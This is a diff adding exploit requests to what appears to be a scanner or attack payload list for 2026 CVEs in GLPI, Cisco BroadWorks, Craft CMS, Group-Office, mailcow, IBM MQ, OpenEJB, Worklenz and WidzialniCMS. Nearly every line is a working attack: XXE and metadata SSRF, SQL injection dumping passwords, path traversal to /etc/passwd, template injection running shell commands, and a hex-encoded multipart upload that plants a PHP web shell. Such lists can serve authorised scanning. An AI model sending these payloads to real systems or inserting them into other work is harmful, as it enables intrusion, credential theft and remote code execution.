@@ -5384,3 +5384,56 @@ POST /societe/card.php header="Content-Type: application/x-www-form-urlencoded" 
 # --- CVE-2026-47678 (GLPI): the dropdown value endpoint concatenates a caller
 #     value into a database query. ---
 POST /ajax/dropdownValue.php header="Content-Type: application/x-www-form-urlencoded" body="itemtype=User&table=glpi_users&field=name&value=1 UNION SELECT password FROM glpi_users"
+
+# --- CVE-2026-20320 (Cisco BroadWorks, KEV): the Open Client Interface
+#     Provisioning XML parser resolves external entities by default, so a
+#     crafted message reads local configuration files. ---
+POST /webservice/OCIProvisioning header="Content-Type: application/xml" body="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><BroadWorksDocument><command>&xxe;</command></BroadWorksDocument>"
+
+# --- CVE-2026-115934 (Craft CMS): the front-end craft.search joins the
+#     attribute parameter into the query, so a UNION or stacked statement
+#     reaches the database. ---
+GET /search?query=news&attribute=title%20UNION%20SELECT%20username,password%20FROM%20users--%20-
+GET /search?query=news&attribute=title%3BSELECT%20SLEEP(5)
+
+# --- CVE-2026-125385 (INDOTALENT WHMS): GetDocument and GetImage combine the
+#     documentName and imageName values with Path.Combine without containment,
+#     so a traversal reads appsettings.json. ---
+GET /Document/GetDocument?documentName=..%2f..%2fappsettings.json
+GET /Image/GetImage?imageName=../../appsettings.json
+
+# --- CVE-2026-125390 (Group-Office): actionProcessUploadQueue accepts absolute
+#     paths in the blobs parameter, hard-linking or copying server files into
+#     the caller's folder. ---
+POST /index.php?r=files/folder/processUploadQueue header="Content-Type: application/x-www-form-urlencoded" body="blobs[]=/etc/passwd&targetFolderId=1"
+
+# --- CVE-2026-63011 (Group-Office): the Contact/labels JMAP endpoint passes the
+#     tpl parameter to TemplateParser::parse(), and an [assign] expression can
+#     invoke a parenthesised PHP function such as ("system")("id"). ---
+POST /index.php?r=contact/labels header="Content-Type: application/x-www-form-urlencoded" body="tpl=[assign var=cmd value=\"{{('system')('id;cat /etc/passwd')}}\"]"
+
+# --- CVE-2026-125757 (mailcow): a domain-wide footer is rendered by the rspamd
+#     MOO_FOOTER prefilter, so a Jinja expression reaches the filter process. ---
+POST /api/v1/edit/domain header="Content-Type: application/json" body="{\"items\":[\"example.com\"],\"attr\":{\"footer\":\"{{ cycler.__init__.__globals__.os.popen('id').read() }}\"}}"
+
+# --- CVE-2026-13284 / CVE-2026-13289 (IBM MQ): the REST messaging and queue
+#     XML parsers allow external entity resolution. ---
+POST /ibmmq/rest/v2/messaging/qmgr/QM1/queue/DEV.QUEUE.1/message header="Content-Type: application/xml" body="<?xml version=\"1.0\"?><!DOCTYPE msg [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><message><data>&x;</data></message>"
+POST /ibmmq/rest/v2/admin/qmgr/QM1/queue header="Content-Type: application/xml" body="<?xml version=\"1.0\"?><!DOCTYPE q [<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><queue>&x;</queue>"
+
+# --- CVE-2026-97881 (OpenEJB): the embedded HTTP server does not confine
+#     static resource paths to the configured directories, so a traversal reads
+#     arbitrary files. ---
+GET /..%2f..%2f..%2f..%2fetc%2fpasswd
+GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# --- CVE-2026-104060 (Worklenz): the reporting members endpoints interpolate
+#     the projects and status values into unparameterized IN clauses. ---
+POST /api/v1/reporting/members/all header="Content-Type: application/json" body="{\"projects\":\"1) AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -\",\"status\":\"active\"}"
+GET /api/v1/reporting/members/export?projects=1%20UNION%20SELECT%20password%20FROM%20users&status=active
+
+# --- CVE-2026-110468 / CVE-2026-110469 (WidzialniCMS): the upload handlers
+#     trust a client-controlled permission value and write an arbitrary file to
+#     a caller-selected currentpath or uploadPath. ---
+POST /panel/controllers/save_photo.php header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d227065726d697373696f6e220d0a0d0a310d0a2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2275706c6f616450617468220d0a0d0a2e2e2f2e2e2f2e2e2f2e2e2f7661722f7777772f68746d6c0d0a2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d227368656c6c2e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0d0a2d2d582d2d0d0a
+POST /panel/upload.php header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d227065726d697373696f6e220d0a0d0a310d0a2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2275706c6f616450617468220d0a0d0a2e2e2f2e2e2f2e2e2f2e2e2f7661722f7777772f68746d6c0d0a2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d227368656c6c2e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0d0a2d2d582d2d0d0a
